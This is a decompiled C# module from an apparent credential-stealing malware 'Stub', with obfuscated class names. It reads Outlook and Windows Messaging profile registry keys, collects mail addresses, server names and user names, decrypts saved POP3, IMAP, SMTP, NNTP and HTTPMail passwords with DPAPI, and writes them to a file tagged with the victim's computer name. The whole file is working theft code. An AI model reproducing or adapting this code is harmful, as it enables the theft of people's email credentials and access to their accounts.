using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000098 RID: 152
	internal sealed class Outlook
	{
		// Token: 0x06000219 RID: 537 RVA: 0x0001479C File Offset: 0x0001299C
		public static void GrabOutlook()
		{
			string[] array = new string[] { "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" };
			string[] mailClients = new string[]
			{
				"SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address", "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
				"Email", "HTTP User", "HTTP Server URL", "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2", "IMAP Password2",
				"NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password", "NNTP Password", "HTTPMail Password", "SMTP Password"
			};
			string text = array.Aggregate("", (string current, string dir) => current + Outlook.Get(dir, mailClients));
			if (!string.IsNullOrEmpty(text))
			{
				Counter.Outlook = true;
				string text2 = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
				string compname = SystemInfo.Compname;
				string text3 = Paths.InitWorkDir();
				Directory.CreateDirectory(text3);
				File.WriteAllText(Path.Combine(text3, string.Concat(new string[] { "Outlook_", compname, "_", text2, ".txt" })), text + "\r\n");
			}
		}

		// Token: 0x0600021A RID: 538 RVA: 0x0001496C File Offset: 0x00012B6C
		private static string Get(string path, string[] clients)
		{
			string text = "";
			try
			{
				foreach (string text2 in clients)
				{
					try
					{
						object infoFromRegistry = Outlook.GetInfoFromRegistry(path, text2);
						if (infoFromRegistry != null && text2.Contains("Password") && !text2.Contains("2"))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Outlook.DecryptValue((byte[])infoFromRegistry),
								"\r\n"
							});
						}
						else if (infoFromRegistry != null && (Outlook.SmptClient.IsMatch(infoFromRegistry.ToString()) || Outlook.MailClient.IsMatch(infoFromRegistry.ToString())))
						{
							text += string.Format("{0}: {1}\r\n", text2, infoFromRegistry);
						}
						else
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Encoding.UTF8.GetString((byte[])infoFromRegistry).Replace(Convert.ToChar(0).ToString(), ""),
								"\r\n"
							});
						}
					}
					catch
					{
					}
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey != null)
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					text = subKeyNames.Aggregate(text, (string current, string client) => current + Outlook.Get(path + "\\" + client, clients));
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x0600021B RID: 539 RVA: 0x00014B38 File Offset: 0x00012D38
		private static object GetInfoFromRegistry(string path, string valueName)
		{
			object obj = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey != null)
				{
					obj = registryKey.GetValue(valueName);
					registryKey.Close();
				}
			}
			catch
			{
			}
			return obj;
		}

		// Token: 0x0600021C RID: 540 RVA: 0x00014B80 File Offset: 0x00012D80
		private static string DecryptValue(byte[] encrypted)
		{
			try
			{
				byte[] array = new byte[encrypted.Length - 1];
				Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}

		// Token: 0x0600021D RID: 541 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Outlook()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600021E RID: 542 RVA: 0x00003E13 File Offset: 0x00002013
		static Outlook()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Outlook.MailClient = new Regex("^[A-Za-z0-9._%+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]{2,}$");
			Outlook.SmptClient = new Regex("^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9\\-]{0,61}[A-Za-z0-9])?\\.)+[A-Za-z]{2,}$");
		}

		// Token: 0x040004E1 RID: 1249
		private static readonly Regex MailClient;

		// Token: 0x040004E2 RID: 1250
		private static readonly Regex SmptClient;
	}
}
